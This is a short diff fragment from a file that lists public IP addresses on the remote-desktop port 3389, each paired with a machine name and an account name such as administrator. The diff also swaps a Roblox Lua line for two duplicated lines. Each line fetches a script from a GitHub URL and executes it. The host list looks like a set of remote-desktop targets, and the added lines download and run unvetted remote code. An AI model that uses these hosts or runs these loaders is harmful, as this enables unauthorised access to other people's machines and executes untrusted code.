@@ -3,4 +3,5 @@
 125.227.46.93:3389@TS-PC\administrator;
 125.229.246.50:3389@WIN10-20200314R\administrator;
 125.231.159.246:3389@MSIUSERWIN11\user;
-loadstring(game:HttpGet("https://raw.githubusercontent.com/onion132005-bit/v3/refs/heads/main/onion13v3.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ParadozCode/CentuDox-Hub-Paradoz-Hub/refs/heads/main/CentuDox%20Loader.xyz", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ParadozCode/CentuDox-Hub-Paradoz-Hub/refs/heads/main/CentuDox%20Loader.xyz", true))()
